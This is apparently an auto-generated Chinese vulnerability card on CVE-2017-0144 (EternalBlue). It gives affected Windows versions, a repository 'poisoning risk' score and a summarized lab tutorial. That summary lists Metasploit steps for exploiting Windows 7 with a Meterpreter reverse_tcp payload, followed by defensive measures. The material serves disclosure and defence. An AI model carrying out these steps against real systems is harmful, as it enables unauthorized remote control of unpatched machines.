## CVE-2017-0144 Windows SMB 远程代码执行漏洞 (EternalBlue)

**漏洞编号:** CVE-2017-0144

**漏洞类型:** 远程代码执行

**影响应用:** Windows SMBv1

**危害等级:** 高危，可能导致远程代码执行，系统完全控制

**影响版本:** Windows Vista SP2, Windows Server 2008 SP2 and R2 SP1, Windows 7 SP1, Windows 8.1, Windows Server 2012 Gold and R2, Windows RT 8.1, Windows 10 Gold, 1511, and 1607; and Windows Server 2016

**利用条件:** 目标系统开启SMBv1服务，攻击者与目标系统网络可达，目标系统未安装MS17-010补丁。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2017-0144 是一个存在于 Windows SMBv1 服务器中的远程代码执行漏洞，也被称为 EternalBlue。攻击者可以利用此漏洞通过发送特制的 SMB 数据包来执行任意代码。 

**有效性:**
根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码（EternalBlue），此漏洞利用的有效性非常高。EternalBlue 被广泛用于实际攻击中，例如 WannaCry 勒索软件。

**投毒风险:**
提供的漏洞利用代码是一个实验教程，包含了如何使用 Metasploit 框架利用 EternalBlue 攻击 Windows 7 的步骤。该仓库主要用于演示攻击流程和提供缓解措施，因此直接包含恶意投毒代码的可能性较低。但是，任何代码都可能被修改以包含恶意功能。因此，在部署或使用任何第三方代码时，务必进行代码审查。此存储库中是否存在作者隐藏的投毒代码的可能性评估为10%，主要考虑到代码可能被修改后植入恶意代码。

**利用方式:**
1.  **环境准备:** 搭建存在漏洞的Windows系统(如Windows 7)和Kali Linux攻击机。
2.  **启动Metasploit:** 在Kali Linux上启动Metasploit框架 (`msfconsole`)。
3.  **搜索漏洞:** 使用 `search ms17_010` 搜索与 EternalBlue 相关的模块。
4.  **选择Exploit:** 选择合适的 EternalBlue exploit 模块 (`use 0`)。
5.  **配置Payload:**  设置要执行的Payload，例如 `set payload windows/x64/meterpreter/reverse_tcp`。 Payload用于在目标系统上执行恶意代码并建立反向连接。
6.  **设置目标IP:**  设置目标 Windows 系统的 IP 地址 (`set RHOST <目标IP>`)。
7.  **执行Exploit:** 运行 `exploit` 命令开始攻击。
8.  **获取Shell:** 如果攻击成功，Metasploit 将建立一个 Meterpreter 会话，允许攻击者在目标系统上执行命令，上传/下载文件等。
9.  **防御措施:**  教程还提供了一些防御措施，例如启用防火墙、安装 MS17-010 补丁、阻止端口 135 和 445 等。



**项目地址:** [luckyman2907/SMB-Protocol-Vulnerability_CVE-2017-0144](https://github.com/luckyman2907/SMB-Protocol-Vulnerability_CVE-2017-0144)

**漏洞详情:** [CVE-2017-0144](https://nvd.nist.gov/vuln/detail/CVE-2017-0144)